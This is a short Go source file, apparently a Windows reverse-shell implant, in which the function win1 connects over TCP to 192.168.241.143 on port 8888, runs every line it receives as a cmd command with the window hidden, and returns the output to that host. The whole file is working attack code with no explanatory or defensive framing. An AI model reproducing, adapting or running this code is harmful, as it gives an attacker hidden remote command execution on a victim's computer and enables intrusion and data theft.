package nc

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
)

func win1() {
	conn, err := net.Dial("tcp", "192.168.241.143"+":"+"8888")
	if err != nil {
		return
	}
	for {
		status, _ := bufio.NewReader(conn).ReadString('\n')
		if status == "exit\n" {
			break
		}
		if status == "" {
			break
		}
		cmd := exec.Command("cmd", "/C", status)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.Output()
		conn.Write([]byte(out))
	}
}
